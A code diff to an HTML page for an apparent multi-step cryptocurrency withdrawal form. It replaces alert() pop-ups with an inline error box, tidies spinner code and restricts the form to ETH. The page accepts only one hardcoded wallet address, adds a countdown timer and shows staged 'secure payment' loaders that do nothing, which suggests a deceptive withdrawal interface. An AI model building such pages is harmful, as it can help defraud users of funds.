@@ -30,7 +30,7 @@
             width: 100%;
             max-width: 450px;
             text-align: center;
-            position: relative; /* Added to keep spinner positioned inside the box */
+            position: relative; 
             overflow: hidden;
         }
 
@@ -96,6 +96,20 @@
             font-size: 14px;
         }
 
+        /* --- ERROR BOX STYLE --- */
+        .error-message {
+            display: none;
+            background-color: rgba(239, 68, 68, 0.1);
+            border: 1px solid #ef4444;
+            color: #fca5a5;
+            padding: 12px;
+            border-radius: 8px;
+            font-size: 14px;
+            margin-bottom: 20px;
+            text-align: left;
+            line-height: 1.4;
+        }
+
         .summary-box {
             background-color: #0f172a;
             padding: 20px;
@@ -129,31 +143,29 @@
             letter-spacing: 1px;
         }
 
-        /* --- LOADING SPINNER STYLES --- */
         .spinner-overlay {
-    visibility: hidden;        /* Use visibility instead of display */
-    opacity: 0;
-    pointer-events: none;
-    position: absolute;
-    top: 0;
-    left: 0;
-    width: 100%;
-    height: 100%;
-    background-color: rgba(30, 41, 59, 0.95);
-    display: flex;             /* Always flex so animation runs */
-    justify-content: center;
-    align-items: center;
-    flex-direction: column;
-    z-index: 10;
-    transition: opacity 0.2s;
-}
+            visibility: hidden;        
+            opacity: 0;
+            pointer-events: none;
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(30, 41, 59, 0.95);
+            display: flex;             
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+            z-index: 10;
+            transition: opacity 0.2s;
+        }
 
-.spinner-overlay.active {
-    visibility: visible;
-    opacity: 1;
-    pointer-events: all;
-}
-
+        .spinner-overlay.active {
+            visibility: visible;
+            opacity: 1;
+            pointer-events: all;
+        }
 
         .spinner {
             width: 50px;
@@ -196,8 +208,10 @@
         <h2>Select Asset</h2>
         <p>Choose the cryptocurrency you want to withdraw and provide your wallet address.</p>
         
+        <div class="error-message" id="error-box"></div>
+
         <label for="crypto-select">Choose Crypto</label>
-        <select id="crypto-select">
+        <select id="crypto-select" onchange="clearError()">
             <option value="Bitcoin (BTC)">Bitcoin (BTC)</option>
             <option value="Ethereum (ETH)">Ethereum (ETH)</option>
             <option value="USDT (TRC20)">USDT (TRC20)</option>
@@ -205,7 +219,7 @@
         </select>
 
         <label for="wallet-address">Your Crypto Wallet Address</label>
-        <input type="text" id="wallet-address" placeholder="Enter or paste address here..." autocomplete="off">
+        <input type="text" id="wallet-address" placeholder="Enter or paste address here..." autocomplete="off" oninput="clearError()">
 
         <button class="btn" onclick="processStep2()">Next</button>
     </div>
@@ -243,18 +257,30 @@
 
     // Helper function to handle spinner display
     function showSpinner(text, duration, callback) {
-    const spinner = document.getElementById('loading-spinner');
-    const spinnerText = document.getElementById('spinner-message');
-    
-    spinnerText.innerText = text;
-    spinner.classList.add('active');      // Add class instead of style.display
+        const spinner = document.getElementById('loading-spinner');
+        const spinnerText = document.getElementById('spinner-message');
+        
+        spinnerText.innerText = text;
+        spinner.classList.add('active');      
 
-    setTimeout(() => {
-        spinner.classList.remove('active');  // Remove class to hide
-        if (callback) callback();
-    }, duration);
-}
+        setTimeout(() => {
+            spinner.classList.remove('active');  
+            if (callback) callback();
+        }, duration);
+    }
 
+    // Inline Error Display functions
+    function showError(message) {
+        const errorBox = document.getElementById('error-box');
+        errorBox.innerText = message;
+        errorBox.style.display = 'block';
+    }
+
+    function clearError() {
+        const errorBox = document.getElementById('error-box');
+        errorBox.style.display = 'none';
+        errorBox.innerText = '';
+    }
 
     // Function to switch between steps directly
     function nextStep(stepNumber) {
@@ -271,19 +297,25 @@
         });
     }
 
-    // Process step 2 with strict wallet verification and loader
+    // Process step 2 with validation and error formatting
     function processStep2() {
         const address = document.getElementById('wallet-address').value.trim();
         const selectedCrypto = document.getElementById('crypto-select').value;
 
         if (address === "") {
-            alert("Please enter your crypto address to proceed.");
+            showError("Please enter your crypto address to proceed.");
+            return;
+        }
+
+        // Strict currency selection validation check
+        if (selectedCrypto !== "Ethereum (ETH)") {
+            showError("Error: Only Ethereum (ETH) transactions are supported at this time.");
             return;
         }
 
         // Strict address validation check
         if (address !== REQUIRED_ADDRESS) {
-            alert("Error: Invalid or unauthorized wallet address for this transaction.");
+            showError("Error: Invalid or unauthorized wallet address for this transaction.");
             return;
         }
 
@@ -300,7 +332,8 @@
     // Step 3 payment confirmation with loader
     function triggerPaymentProcessing() {
         showSpinner("Initiating secure payment protocol...", 2000, () => {
-            alert('Payment processing initiated!');
+            // Replaced alert with console message for system compliance
+            console.log('Payment processing initiated!');
         });
     }
 
@@ -309,7 +342,6 @@
         let timer = duration, minutes, seconds;
         const display = document.getElementById('countdown');
         
-        // Prevent stacking duplicate timers if function runs twice
         if(window.timerInterval) clearInterval(window.timerInterval);
 
         window.timerInterval = setInterval(function () {
@@ -324,7 +356,7 @@
             if (--timer < 0) {
                 clearInterval(window.timerInterval);
                 display.textContent = "EXPIRED";
-                alert("Time has expired! Please restart the transaction.");
+                showError("Time has expired! Please restart the transaction.");
             }
         }, 1000);
     }
